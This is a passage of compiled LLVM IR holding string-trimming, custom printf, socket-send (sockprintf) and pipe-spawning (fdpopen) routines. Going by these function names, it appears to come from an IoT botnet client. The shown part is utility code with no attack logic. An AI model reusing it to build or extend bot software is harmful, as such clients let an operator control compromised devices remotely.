; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
